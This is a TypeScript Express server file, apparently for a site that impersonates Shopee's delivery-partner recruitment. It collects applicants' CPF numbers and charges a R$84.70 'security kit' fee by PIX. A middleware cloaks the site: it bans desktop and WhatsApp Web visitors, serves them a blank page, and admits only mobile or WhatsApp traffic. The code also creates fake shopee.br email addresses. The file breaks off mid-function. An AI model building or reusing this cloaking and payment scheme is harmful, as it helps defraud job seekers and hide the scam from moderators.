import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from 'ws';
import { storage } from "./storage";
import { paymentService } from "./payment";
import { createFor4Payment } from "./for4payments-bridge";
import { 
  insertCandidateSchema, 
  insertStateSchema, 
  insertBenefitSchema,
  insertUserSchema,
  insertBannedIpSchema
} from "@shared/schema";

// Tipagem para o cache global de pagamentos
declare global {
  var _paymentCache: {
    [id: string]: {
      id: string;
      pixCode: string;
      pixQrCode: string;
      name: string;
      cpf: string;
      email: string;
      timestamp: string;
      [key: string]: any;
    }
  } | undefined;
}
import axios from "axios";
import MobileDetect from "mobile-detect";

// Importar spawn do child_process para executar scripts Python
import { spawn } from 'child_process';

// Lista de IPs que nunca devem ser banidos automaticamente
// Estes IPs podem acessar o site mesmo de desktop sem serem banidos
const neverBanIPs = [
  "201.87.251.", // IP mencionado nos logs como banido incorretamente
  "201.87.251.220", // IP específico do cliente (sempre permitido)
  "191.247.4.",  // IP mencionado nos logs como banido incorretamente
  "127.0.0.1",   // Localhost
  "::1"          // Localhost IPv6
];

// Função auxiliar para obter o host do cliente de forma consistente
function getClientHost(req: Request): string {
  // Tentar obter do header origin primeiro
  let clientHost = req.headers.origin;
  
  // Se não tiver origin, tentar encontrar o referer
  if (!clientHost && req.headers.referer) {
    try {
      const refererUrl = new URL(req.headers.referer);
      clientHost = `${refererUrl.protocol}//${refererUrl.host}`;
    } catch (e) {
      console.log('[URL] Erro ao processar referer URL:', e);
    }
  }
  
  // Fallback para domínios conhecidos de produção
  if (!clientHost) {
    // Verificar se estamos em ambiente de produção
    if (process.env.NODE_ENV === 'production') {
      clientHost = 'https://shopee-entregador.netlify.app';
    } else {
      // Para desenvolvimento local, usar o endereço do servidor Replit
      const host = req.get('host') || '';
      clientHost = `${req.protocol}://${host}`;
    }
  }
  
  console.log(`[URL] Usando clientHost: ${clientHost}`);
  return clientHost;
}

// Função para obter localização de um IP usando o ipinfo.io (API gratuita sem necessidade de chave)
async function getIpLocation(ip: string): Promise<string> {
  try {
    // Use um serviço de mock para desenvolvimento local
    if (ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1" || ip.startsWith("::ffff:")) {
      return "Local Development";
    }
    
    // Remover qualquer prefixo IPv6 para IPv4 e limpar múltiplos IPs (em caso de proxy)
    let cleanIp = ip.replace(/^::ffff:/, '');
    
    // Se tivermos múltiplos IPs (comum em headers X-Forwarded-For), pegue apenas o primeiro
    if (cleanIp.includes(',')) {
      cleanIp = cleanIp.split(',')[0].trim();
    }
    
    // Para IPs privados ou localhost, não faça a chamada para API externa
    if (cleanIp === '127.0.0.1' || 
        cleanIp.startsWith('10.') || 
        cleanIp.startsWith('192.168.') || 
        cleanIp.startsWith('172.')) {
      return "IP Local/Privado";
    }
    
    // Usar a API ipinfo.io (não requer chave para uso básico)
    const response = await axios.get(`https://ipinfo.io/${cleanIp}/json`);
    
    if (response.data) {
      const locationData = response.data;
      if (locationData.city && locationData.country) {
        return `${locationData.city}, ${locationData.region || ''}, ${locationData.country}`;
      } else if (locationData.country) {
        return `${locationData.country}`;
      }
    }
    
    return "Localização não disponível";
  } catch (error) {
    console.error("Erro ao obter localização do IP:", error);
    return "Localização não disponível";
  }
}

// Middleware para verificar se o usuário está usando desktop
async function desktopDetectionMiddleware(req: Request, res: Response, next: NextFunction) {
  // Ignorar requisições de API, admin e relacionadas a domínios
  if (req.path.startsWith("/api") || req.path.startsWith("/ips") || req.path.startsWith("/domains")) {
    return next();
  }
  
  const userAgent = req.headers["user-agent"] || "";
  const md = new MobileDetect(userAgent);
  const ip = (req.headers["x-forwarded-for"] as string) || 
             req.socket.remoteAddress || 
             "unknown";
  const referer = req.headers.referer || '';
  
  // Verificar se o domínio está na lista de permitidos
  const host = req.get('host') || '';
  const domain = host.split(':')[0]; // Remove a porta, se houver
  
  // Permitir acesso em ambiente Replit
  if (domain.includes('replit') || domain.includes('kirk') || domain.includes('-00-')) {
    console.log(`[DEBUG] Domínio de desenvolvimento Replit detectado: ${domain}. Acesso permitido.`);
    return next();
  }
  
  // Se o domínio estiver na lista de permitidos e ativo, permitir acesso independente do dispositivo
  const allowedDomain = await storage.getAllowedDomain(domain);
  if (allowedDomain && allowedDomain.isActive) {
    console.log(`[DEBUG] Domínio ${domain} está na lista de permitidos. Acesso permitido.`);
    return next();
  }
  
  // Verificar se o IP já está banido
  const bannedIp = await storage.getBannedIp(ip);
  if (bannedIp && bannedIp.isBanned) {
    console.log(`[BLOQUEIO] IP ${ip} está banido. Bloqueando acesso.`);
    // IP já está banido, retornar página em branco com status 403
    return res.status(403).send(`
      <html>
        <head>
          <title>about:blank</title>
          <script>
            window.location.href = "about:blank";
          </script>
        </head>
        <body></body>
      </html>
    `);
  }
  
  console.log(`[ACESSO] Host: ${domain}, IP: ${ip}, UserAgent: ${userAgent}`);
  
  // Verificar acesso via aplicativo WhatsApp mobile (SEMPRE PERMITIR)
  if (userAgent.startsWith('WhatsApp/') && !userAgent.includes('WhatsApp Web')) {
    console.log(`[PERMITIDO] Acesso via aplicativo WhatsApp Mobile: ${userAgent}. Permitindo acesso.`);
    return next();
  }
  
  // Verificação 1: Permitir apenas links oficiais bit.ly (e não de anúncios)
  if ((referer.includes('bit.ly/shopee-oficial') || 
       referer.includes('bit.ly/shopee') || 
       referer.includes('bitly/shopee')) &&
      !referer.includes('facebook.com/ads') && 
      !referer.includes('fb.com/ads') && 
      !referer.includes('ad.doubleclick')) {
    console.log(`[PERMITIDO] Acesso via link oficial bit.ly: ${referer}. Permitindo acesso.`);
    return next();
  }
  
  // Verificação 2: Permitir redirecionamentos WhatsApp não promocionais
  if (referer.includes('whatsapp') && 
      !referer.includes('ads') && 
      !referer.includes('ad.') && 
      !referer.includes('admanager')) {
    console.log(`[PERMITIDO] Acesso via WhatsApp: ${referer}. Permitindo acesso.`);
    return next();
  }
  
  // Verificação 3: Verificar parâmetros UTM para permitir acessos legítimos
  const utm_source = req.query.utm_source || '';
  const utm_medium = req.query.utm_medium || '';
  const utm_campaign = req.query.utm_campaign || '';
  
  // Identificar se vem de anúncios pagos
  const isFromAd = 
    (typeof utm_source === 'string' && (
      utm_source.toLowerCase().includes('ad') || 
      utm_source.toLowerCase().includes('fbads') || 
      utm_source.toLowerCase().includes('instagram_ad')
    )) || 
    (typeof utm_medium === 'string' && (
      utm_medium.toLowerCase().includes('cpc') || 
      utm_medium.toLowerCase().includes('paid') || 
      utm_medium.toLowerCase().includes('ad')
    ));
  
  // Permitir apenas quando vem do WhatsApp e não é um anúncio
  if (!isFromAd && 
      ((typeof utm_source === 'string' && (
        utm_source.toLowerCase().includes('whatsapp') || 
        utm_source.toLowerCase().includes('bitly') || 
        utm_source.toLowerCase().includes('shopee')
      )) || 
      (typeof utm_medium === 'string' && utm_medium.toLowerCase().includes('whatsapp')) ||
      (typeof utm_campaign === 'string' && utm_campaign.toLowerCase().includes('shopee'))
     )) {
    console.log(`[PERMITIDO] Acesso via campanha oficial orgânica. utm_source: ${utm_source}, utm_medium: ${utm_medium}. Permitindo acesso.`);
    return next();
  }
  
  // Verificação 4: Para outros acessos, verificar se é móvel
  const isMobile = md.mobile() !== null || md.phone() !== null || md.tablet() !== null;
  if (isMobile && !userAgent.includes('WhatsApp Web')) {
    return next();
  }
  
  // Se chegou até aqui, é um acesso desktop ou WhatsApp Web
  
  // Verificação 5: Verificar se o IP está na lista de exceções
  const ipBaseWithoutProxy = ip.split(',')[0].trim();
  if (neverBanIPs.some(whitelistedIP => ipBaseWithoutProxy.includes(whitelistedIP))) {
    console.log(`[PERMITIDO] IP ${ip} está na lista de exceções. Acesso permitido mesmo sendo desktop.`);
    return next();
  }
  
  // BLOQUEIO: É um desktop ou WhatsApp Web e não está na lista de exceções
  const location = await getIpLocation(ip);
  const origin = req.headers.origin || '';
  const acceptLanguage = req.headers["accept-language"] || '';
  
  // Extrair informações do dispositivo
  let device = "Desktop";
  if (userAgent.includes('WhatsApp Web')) {
    device = "WhatsApp Web";
  }
  
  // Extrair informações do navegador
  let browserInfo = "Navegador desconhecido";
  if (userAgent.includes("Chrome")) {
    browserInfo = `Chrome ${userAgent.match(/Chrome\/([\d.]+)/)?.[1] || ""}`;
  } else if (userAgent.includes("Firefox")) {
    browserInfo = `Firefox ${userAgent.match(/Firefox\/([\d.]+)/)?.[1] || ""}`;
  } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
    browserInfo = `Safari ${userAgent.match(/Version\/([\d.]+)/)?.[1] || ""}`;
  } else if (userAgent.includes("MSIE") || userAgent.includes("Trident")) {
    browserInfo = `Internet Explorer ${userAgent.match(/(?:MSIE |rv:)([\d.]+)/)?.[1] || ""}`;
  } else if (userAgent.includes("Edge") || userAgent.includes("Edg/")) {
    browserInfo = `Microsoft Edge ${userAgent.match(/(?:Edge|Edg)\/([\d.]+)/)?.[1] || ""}`;
  } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
    browserInfo = `Opera ${userAgent.match(/(?:Opera|OPR)\/([\d.]+)/)?.[1] || ""}`;
  }
  
  // Extrair sistema operacional
  let platform = "Plataforma desconhecida";
  if (userAgent.includes("Windows")) {
    platform = `Windows ${userAgent.match(/Windows NT ([\d.]+)/)?.[1] || ""}`;
    if (platform.includes("6.1")) platform = "Windows 7";
    if (platform.includes("6.2")) platform = "Windows 8";
    if (platform.includes("6.3")) platform = "Windows 8.1";
    if (platform.includes("10.0")) platform = "Windows 10/11";
  } else if (userAgent.includes("Mac OS X")) {
    platform = `macOS ${userAgent.match(/Mac OS X ([\d_.]+)/)?.[1]?.replace(/_/g, '.') || ""}`;
  } else if (userAgent.includes("Linux")) {
    platform = "Linux";
    if (userAgent.includes("Ubuntu")) platform = "Ubuntu Linux";
    if (userAgent.includes("Fedora")) platform = "Fedora Linux";
  } else if (userAgent.includes("Android")) {
    platform = `Android ${userAgent.match(/Android ([\d.]+)/)?.[1] || ""}`;
  } else if (userAgent.includes("iOS") || userAgent.includes("iPhone OS")) {
    platform = `iOS ${userAgent.match(/(?:iOS|iPhone OS) ([\d_]+)/)?.[1]?.replace(/_/g, '.') || ""}`;
  }
  
  // Determinar a fonte de tráfego
  let refererAnalysis = "Acesso direto";
  if (referer) {
    try {
      const refererUrl = new URL(referer);
      if (refererUrl.hostname.includes('facebook')) {
        refererAnalysis = "Facebook";
        if (referer.includes('facebook.com/ads')) {
          refererAnalysis = "Anúncio no Facebook";
        }
      } else if (refererUrl.hostname.includes('instagram')) {
        refererAnalysis = "Instagram";
        if (referer.includes('instagram.com/ads') || referer.includes('ads_manager')) {
          refererAnalysis = "Anúncio no Instagram";
        }
      } else if (refererUrl.hostname.includes('google')) {
        refererAnalysis = "Google";
        if (referer.includes('google.com/ads') || referer.includes('adwords')) {
          refererAnalysis = "Google Ads";
        }
      } else if (refererUrl.hostname.includes('youtube')) {
        refererAnalysis = "YouTube";
      } else if (refererUrl.hostname.includes('twitter') || refererUrl.hostname.includes('x.com')) {
        refererAnalysis = "Twitter / X";
      } else if (refererUrl.hostname.includes('pinterest')) {
        refererAnalysis = "Pinterest";
      } else if (refererUrl.hostname.includes('tiktok')) {
        refererAnalysis = "TikTok";
      } else {
        refererAnalysis = `De: ${refererUrl.hostname}`;
      }
    } catch (e) {
      refererAnalysis = referer.substring(0, 100);
    }
  }
  
  // Verificar se o IP já existe no banco de dados antes de inserir
  const existingBannedIp = await storage.getBannedIp(ip);
  
  if (!existingBannedIp) {
    // IP não existe, criar novo registro
    const bannedIpData = {
      ip,
      isBanned: true,
      userAgent: userAgent || '',
      referer: referer || '',
      origin: origin || '',
      device,
      browserInfo,
      screenSize: "",
      platform,
      language: acceptLanguage as string,
      reason: device === "WhatsApp Web" 
        ? `Tentativa de acesso via WhatsApp Web (${refererAnalysis})`
        : `Tentativa de acesso via desktop (${refererAnalysis})`,
      location,
      accessUrl: req.originalUrl || req.url || '/'
    };
    
    await storage.createBannedIp(bannedIpData);
    
    // Notificar os clientes WebSocket sobre o novo IP banido se houver conexões ativas
    if (typeof connectedClients !== 'undefined' && connectedClients.length > 0) {
      const ipInfo = {
        ip,
        userAgent: userAgent || 'Desconhecido',
        device,
        browserInfo,
        platform,
        location,
        reason: device === "WhatsApp Web" 
          ? `Tentativa de acesso via WhatsApp Web (${refererAnalysis})`
          : `Tentativa de acesso via desktop (${refererAnalysis})`,
        timestamp: new Date().toISOString()
      };
      
      broadcastToAll({
        type: 'ip_banned',
        ip: ipInfo
      });
      
      // Atualizar estatísticas de dispositivos
      if (typeof deviceStats !== 'undefined') {
        if (device.includes('WhatsApp Web')) {
          deviceStats = deviceStats.map(stat => 
            stat.type === 'WhatsApp Web' ? {...stat, count: stat.count + 1} : stat
          );
        } else if (device.includes('Desktop')) {
          deviceStats = deviceStats.map(stat => 
            stat.type === 'Desktop (Bloqueado)' ? {...stat, count: stat.count + 1} : stat
          );
        }
        
        // Broadcast das estatísticas atualizadas
        broadcastToAll({
          type: 'device_stats',
          devices: deviceStats
        });
      }
      
      // Atualizar estatísticas de origens de acesso
      if (typeof accessSources !== 'undefined') {
        let source = "Outros";
        if (referer.includes('whatsapp')) {
          source = "WhatsApp";
        } else if (referer.includes('facebook') || referer.includes('fb.com')) {
          source = "Facebook";
        } else if (referer.includes('instagram')) {
          source = "Instagram";
        } else if (referer.includes('google')) {
          source = referer.includes('ads') ? "Google" : "Pesquisa Orgânica";
        } else if (!referer) {
          source = "Link Direto";
        }
        
        accessSources = accessSources.map(item => 
          item.source === source ? {...item, count: item.count + 1} : item
        );
        
        // Broadcast das estatísticas atualizadas
        broadcastToAll({
          type: 'access_sources',
          sources: accessSources
        });
      }
    }
  } else if (!existingBannedIp.isBanned) {
    // IP existe mas não está banido, atualizar para banido
    await storage.updateBannedIpStatus(ip, true);
    
    // Notificar WebSocket se necessário
    if (typeof connectedClients !== 'undefined' && connectedClients.length > 0) {
      broadcastToAll({
        type: 'dashboard_stats',
        stats: await getDashboardStats()
      });
    }
  }
  
  console.log(`[BLOQUEIO] IP ${ip} banido por acesso via ${device}. Origem: ${refererAnalysis}, Navegador: ${browserInfo}, SO: ${platform}`);
  
  // Retornar página em branco para desktop
  return res.status(403).send(`
    <html>
      <head>
        <title>about:blank</title>
        <script>
          window.location.href = "about:blank";
        </script>
      </head>
      <body></body>
    </html>
  `);
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Aplicar middleware de detecção de desktop para todas as rotas
  app.use(desktopDetectionMiddleware);
  
  // Rota de healthcheck
  app.get('/health', (req, res) => {
    res.json({
      status: 'ok',
      env: process.env.NODE_ENV || 'development',
      version: '1.0.0',
      message: 'For4Payments API está operacional',
      timestamp: new Date().toISOString()
    });
  });
  
  // Novos endpoints para gerenciamento de IPs banidos
  
  // Verificar se o IP atual está banido
  app.get("/api/admin/check-ip-banned", async (req, res) => {
    try {
      const ip = req.ip || req.socket.remoteAddress || '0.0.0.0';
      const bannedIp = await storage.getBannedIp(ip);
      
      res.json({ 
        isBanned: !!bannedIp?.isBanned,
        ip: ip,
        bannedAt: bannedIp?.bannedAt 
      });
    } catch (error) {
      console.error("Erro ao verificar IP banido:", error);
      res.status(500).json({ error: "Erro ao verificar status do IP" });
    }
  });
  
  // Reportar acesso desktop para banir o IP permanentemente
  app.post("/api/admin/report-desktop-access", async (req, res) => {
    try {
      const ip = req.ip || req.socket.remoteAddress || '0.0.0.0';
      
      // Verificar se o IP já está na lista de exceções
      const ipBaseWithoutProxy = ip.split(',')[0].trim();
      if (neverBanIPs.some(whitelistedIP => ipBaseWithoutProxy.includes(whitelistedIP))) {
        console.log(`[PERMITIDO] IP ${ip} está na lista de exceções. Não será banido.`);
        return res.json({ 
          success: true, 
          message: "IP está na lista de exceções",
          ip: ip,
          isBanned: false
        });
      }
      
      const userAgent = req.headers["user-agent"] || '';
      const referer = req.headers.referer || '';
      const origin = req.headers.origin || '';
      const location = await getIpLocation(ip);
      
      // Verificar se o IP já está registrado
      let bannedIp = await storage.getBannedIp(ip);
      
      // Se não existir, criar um novo registro com status banido
      if (!bannedIp) {
        bannedIp = await storage.createBannedIp({
          ip,
          isBanned: true,
          userAgent: userAgent || '',
          referer: referer || '',
          origin: origin || '',
          device: "Desktop (Frontend)",
          browserInfo: userAgent,
          screenSize: "",
          platform: "",
          language: req.headers["accept-language"] as string || '',
          reason: "Acesso via desktop detectado pelo frontend",
          location,
          accessUrl: req.originalUrl || req.url || '/'
        });
        console.log(`[BLOQUEIO] Novo IP banido via frontend: ${ip}`);
      } 
      // Se já existir, mas não estiver banido, atualizar para banido
      else if (!bannedIp.isBanned) {
        bannedIp = await storage.updateBannedIpStatus(ip, true);
        console.log(`[BLOQUEIO] IP atualizado para banido via frontend: ${ip}`);
      }
      
      res.json({ 
        success: true, 
        message: "IP banido com sucesso",
        ip: ip,
        isBanned: true
      });
    } catch (error) {
      console.error("Erro ao banir IP:", error);
      res.status(500).json({ error: "Erro ao banir IP" });
    }
  });
  
  // Rota proxy para For4Payments para evitar CORS
  app.post('/api/proxy/for4payments/pix', async (req, res) => {
    try {
      // Verificar se a API For4Payments está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
        return res.status(500).json({
          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
        });
      }
      
      console.log('Iniciando proxy para For4Payments...');
      
      // Configurar cabeçalhos para a requisição à For4Payments
      const apiUrl = 'https://app.for4payments.com.br/api/v1/transaction.purchase';
      const secretKey = process.env.FOR4PAYMENTS_SECRET_KEY;
      
      // Processar os dados recebidos
      const { name, cpf, email, phone, amount = 84.70, description = "Kit de Segurança Shopee Delivery" } = req.body;
      
      if (!name || !cpf) {
        return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
      }
      
      // Processar CPF - remover caracteres não numéricos
      const cleanedCpf = cpf.replace(/[^0-9]/g, '');
      
      // Processar telefone - remover caracteres não numéricos 
      const cleanedPhone = phone ? phone.replace(/\D/g, '') : null;
      
      // Converter valor para centavos
      const amountInCents = Math.round(amount * 100);
      
      // Gerar email se não tiver sido fornecido
      const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
      
      // Construir payload para a For4Payments conforme formato esperado
      const payload = {
        name,
        email: userEmail,
        cpf: cleanedCpf,
        phone: cleanedPhone, // Telefone limpo, apenas números
        paymentMethod: "PIX",
        amount: amountInCents,
        items: [{
          title: description || "Kit de Segurança",
          quantity: 1,
          unitPrice: amountInCents,
          tangible: false
        }]
      };
      
      console.log('Enviando requisição para For4Payments API via proxy...', {
        name: payload.name,
        cpf: `${cleanedCpf.substring(0, 3)}***${cleanedCpf.substring(cleanedCpf.length - 2)}`
      });
      
      // Enviar requisição para For4Payments
      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': secretKey, // A API espera apenas o token sem o prefixo 'Bearer'
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      
      // Processar resposta
      const result = await response.json();
      
      console.log('Resposta da For4Payments recebida pelo proxy');
      
      // Se a resposta foi bem-sucedida e temos os dados do PIX, enviar email
      if (response.status === 200 && result && result.pixCode && result.pixQrCode) {
        // Importar o serviço de email
        const { emailService } = await import('./email-service');
        
        // Formatar o valor para exibição
        const formattedAmount = new Intl.NumberFormat('pt-BR', {
          style: 'currency',
          currency: 'BRL'
        }).format(amount);
        
        // Construir o link para a página de pagamento (se houver)
        // O frontend pode ter uma página específica para acompanhamento do pagamento
        const clientHost = req.headers.origin || 'https://shopee-entregador.netlify.app';
        const paymentLink = `${clientHost}/payment?id=${result.id}&email=${encodeURIComponent(userEmail)}`;
        
        // Enviar o email de confirmação
        try {
          const emailSent = await emailService.sendPaymentConfirmationEmail({
            email: userEmail,
            name,
            pixCode: result.pixCode,
            pixQrCode: result.pixQrCode,
            amount,
            formattedAmount,
            paymentLink
          });
          
          // Adicionar informação de email enviado à resposta
          result.emailSent = emailSent;
          
          if (emailSent) {
            console.log(`Email de confirmação enviado com sucesso para ${userEmail}`);
          } else {
            console.error(`Falha ao enviar email de confirmação para ${userEmail}`);
          }
        } catch (emailError) {
          console.error('Erro ao enviar email de confirmação:', emailError);
          result.emailSent = false;
          result.emailError = 'Falha ao enviar email de confirmação';
        }
      }
      
      // Retornar resposta para o cliente
      return res.status(response.status).json(result);
    } catch (error: any) {
      console.error('Erro no proxy For4Payments:', error);
      return res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento pelo proxy'
      });
    }
  });
  // Rota para obter todos os estados
  app.get('/api/states', async (req, res) => {
    try {
      const states = await storage.getAllStates();
      res.json(states);
    } catch (error) {
      console.error('Erro ao buscar estados:', error);
      res.status(500).json({ error: 'Falha ao buscar estados' });
    }
  });

  // Rota para obter estados com vagas disponíveis
  app.get('/api/states/with-vacancies', async (req, res) => {
    try {
      const states = await storage.getStatesWithVacancies();
      res.json(states);
    } catch (error) {
      console.error('Erro ao buscar estados com vagas:', error);
      res.status(500).json({ error: 'Falha ao buscar estados com vagas' });
    }
  });

  // Manter a rota de regiões para retrocompatibilidade
  app.get('/api/regions', async (req, res) => {
    try {
      const states = await storage.getAllStates();
      
      // Mapear o formato antigo, agora usando o vacancyCount
      const regions = states.map(state => ({
        name: state.name,
        abbr: state.code,
        vacancies: state.vacancyCount
      }));
      
      res.json(regions);
    } catch (error) {
      console.error('Erro ao buscar regiões:', error);
      res.status(500).json({ error: 'Falha ao buscar regiões' });
    }
  });

  // Rota para criar ou atualizar um estado
  app.post('/api/states', async (req, res) => {
    try {
      const stateData = insertStateSchema.parse(req.body);
      const state = await storage.createState(stateData);
      res.status(201).json(state);
    } catch (error) {
      console.error('Erro ao criar estado:', error);
      res.status(400).json({ error: 'Dados inválidos para criar estado' });
    }
  });

  // Rota para obter todos os benefícios
  app.get('/api/benefits', async (req, res) => {
    try {
      const benefits = await storage.getAllBenefits();
      res.json(benefits);
    } catch (error) {
      console.error('Erro ao buscar benefícios:', error);
      res.status(500).json({ error: 'Falha ao buscar benefícios' });
    }
  });

  // Rota para criar um benefício
  app.post('/api/benefits', async (req, res) => {
    try {
      const benefitData = insertBenefitSchema.parse(req.body);
      const benefit = await storage.createBenefit(benefitData);
      res.status(201).json(benefit);
    } catch (error) {
      console.error('Erro ao criar benefício:', error);
      res.status(400).json({ error: 'Dados inválidos para criar benefício' });
    }
  });

  // Rota para criar um candidato (delivery partner)
  app.post('/api/candidates', async (req, res) => {
    try {
      const candidateData = insertCandidateSchema.parse(req.body);
      
      // Verificar se o email já está cadastrado
      const existingCandidate = await storage.getCandidateByEmail(candidateData.email);
      if (existingCandidate) {
        return res.status(409).json({ error: 'Email já cadastrado' });
      }
      
      // Verificar se o estado existe
      const state = await storage.getState(candidateData.state);
      if (!state) {
        return res.status(400).json({ error: 'Estado inválido' });
      }
      
      const candidate = await storage.createCandidate(candidateData);
      res.status(201).json(candidate);
    } catch (error) {
      console.error('Erro ao criar candidato:', error);
      res.status(400).json({ error: 'Dados inválidos para criar candidato' });
    }
  });

  // Rota para obter todos os candidatos
  app.get('/api/candidates', async (req, res) => {
    try {
      const candidates = await storage.getAllCandidates();
      res.json(candidates);
    } catch (error) {
      console.error('Erro ao buscar candidatos:', error);
      res.status(500).json({ error: 'Falha ao buscar candidatos' });
    }
  });

  // Rota para processar pagamento PIX (usando TS API For4Payments)
  app.post('/api/payments/pix', async (req, res) => {
    try {
      // Verificar se a API For4Payments está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
        return res.status(500).json({
          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
        });
      }

      console.log('Dados de pagamento recebidos:', req.body);
      
      // Validar dados da requisição
      const { name, email, cpf, phone } = req.body;
      
      // Validação básica
      if (!name) {
        return res.status(400).json({ error: 'Nome é obrigatório.' });
      }
      
      if (!cpf) {
        return res.status(400).json({ error: 'CPF é obrigatório.' });
      }
      
      // Valor fixo para o kit de segurança: R$ 84,70
      const paymentAmount = 84.70;
      
      // Usar o email fornecido ou gerar um
      const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
      
      console.log(`Processando pagamento de R$ ${paymentAmount} para ${name}, CPF ${cpf}`);
      
      // Processar pagamento via For4Payments
      const paymentResult = await paymentService.createPixPayment({
        name,
        email: userEmail,
        cpf,
        phone: phone || '',
        amount: paymentAmount
      });
      
      console.log('Resultado do pagamento For4Payments:', paymentResult);
      
      // Se o pagamento foi processado com sucesso, enviar email
      if (paymentResult.pixCode && paymentResult.pixQrCode) {
        // Importar o serviço de email
        const { emailService } = await import('./email-service');
        
        // Formatar o valor para exibição
        const formattedAmount = new Intl.NumberFormat('pt-BR', {
          style: 'currency',
          currency: 'BRL'
        }).format(paymentAmount);
        
        // Construir o link para a página de pagamento (se houver)
        const clientHost = req.headers.origin || 'https://shopee-entregador.netlify.app';
        const paymentLink = `${clientHost}/payment?id=${paymentResult.id}&email=${encodeURIComponent(userEmail)}`;
        
        // Enviar o email de confirmação
        try {
          const emailSent = await emailService.sendPaymentConfirmationEmail({
            email: userEmail,
            name,
            pixCode: paymentResult.pixCode,
            pixQrCode: paymentResult.pixQrCode,
            amount: paymentAmount,
            formattedAmount,
            paymentLink
          });
          
          // Adicionar informação de email enviado à resposta
          paymentResult.emailSent = emailSent;
          
          if (emailSent) {
            console.log(`Email de confirmação enviado com sucesso para ${userEmail}`);
          } else {
            console.error(`Falha ao enviar email de confirmação para ${userEmail}`);
          }
        } catch (emailError) {
          console.error('Erro ao enviar email de confirmação:', emailError);
          paymentResult.emailSent = false;
          paymentResult.emailError = 'Falha ao enviar email de confirmação';
        }
      }
      
      // Retornar resultado para o frontend
      res.status(200).json(paymentResult);
    } catch (error: any) {
      console.error('Erro ao processar pagamento PIX:', error);
      res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento PIX.'
      });
    }
  });
  
  // Rota para processar pagamento PIX
  // Rota para obter informações de pagamento específicas por ID
  app.get('/api/payments/:id', async (req, res) => {
    try {
      const { id } = req.params;
      
      if (!id) {
        return res.status(400).json({ error: 'ID de pagamento não fornecido' });
      }
      
      // Em uma implementação real, buscaríamos as informações no banco de dados
      // Neste caso, estamos usando a API For4Payments diretamente
      // para obter os dados da transação original
      
      // Simular busca de pagamento (no futuro, isso será substituído por uma consulta ao banco)
      const { paymentService } = await import('./payment');
      
      // Verificar se o pagamento existe nos registros
      // Nota: A API For4Payments atual não fornece um endpoint para verificar status
      // Então retornamos os dados do cache ou sessionStorage temporário
      
      // Como não temos uma forma de buscar o pagamento por ID diretamente,
      // vamos verificar o cache temporário (que será substituído por DB no futuro)
      const paymentCache = global._paymentCache || {};
      const paymentData = paymentCache[id];
      
      if (!paymentData) {
        return res.status(404).json({ 
          error: 'Pagamento não encontrado. O link pode ter expirado.' 
        });
      }
      
      // Retornar os dados do pagamento
      return res.json({
        id: paymentData.id,
        pixCode: paymentData.pixCode,
        pixQrCode: paymentData.pixQrCode,
        name: paymentData.name,
        cpf: paymentData.cpf,
        email: paymentData.email
      });
      
    } catch (error: any) {
      console.error('Erro ao buscar informações de pagamento:', error);
      res.status(500).json({ 
        error: 'Erro ao buscar informações de pagamento', 
        details: error.message 
      });
    }
  });

  app.post('/api/payments/pix-python', async (req, res) => {
    try {
      // Validar dados da requisição
      const { nome, email, cpf, telefone } = req.body;
      
      // Validação básica
      if (!nome || !cpf) {
        return res.status(400).json({ 
          error: 'Dados incompletos. Nome e CPF são obrigatórios.' 
        });
      }
      
      // Verificar se a chave secreta está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.error('FOR4PAYMENTS_SECRET_KEY não configurada');
        return res.status(500).json({ 
          error: 'FOR4PAYMENTS_SECRET_KEY não configurada. Configure a chave de API For4Payments.'
        });
      }
      
      console.log('Processando pagamento via API For4Payments...');
      
      // Usar o email fornecido ou gerar um
      const userEmail = email || `${nome.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
      
      // Valor fixo para o kit de segurança: R$ 84,70
      const paymentAmount = 84.70;
      
      // Processar pagamento via API For4Payments
      const paymentResult = await paymentService.createPixPayment({
        name: nome,
        email: userEmail,
        cpf: cpf,
        phone: telefone || '',
        amount: paymentAmount
      });
      
      // Armazenar dados do pagamento em cache global
      // Isso é uma solução temporária até termos um banco de dados adequado
      // Este é um anti-padrão em produção, mas funciona para este exemplo
      if (!global._paymentCache) {
        global._paymentCache = {};
      }
      
      global._paymentCache[paymentResult.id] = {
        ...paymentResult,
        name: nome,
        cpf: cpf,
        email: userEmail,
        timestamp: new Date().toISOString()
      };
      
      // Se o pagamento foi processado com sucesso, enviar email
      if (paymentResult.pixCode && paymentResult.pixQrCode) {
        // Importar o serviço de email
        const { emailService } = await import('./email-service');
        
        // Formatar o valor para exibição
        const formattedAmount = new Intl.NumberFormat('pt-BR', {
          style: 'currency',
          currency: 'BRL'
        }).format(paymentAmount);
        
        // Construir o link para a página de pagamento (se houver)
        const clientHost = req.headers.origin || 'https://shopee-entregador.netlify.app';
        const paymentLink = `${clientHost}/payment?id=${paymentResult.id}&email=${encodeURIComponent(userEmail)}`;
        
        // Enviar o email de confirmação
        try {
          const emailSent = await emailService.sendPaymentConfirmationEmail({
            email: userEmail,
            name: nome,
            pixCode: paymentResult.pixCode,
            pixQrCode: paymentResult.pixQrCode,
            amount: paymentAmount,
            formattedAmount,
            paymentLink
          });
          
          // Adicionar informação de email enviado à resposta
          paymentResult.emailSent = emailSent;
          
          if (emailSent) {
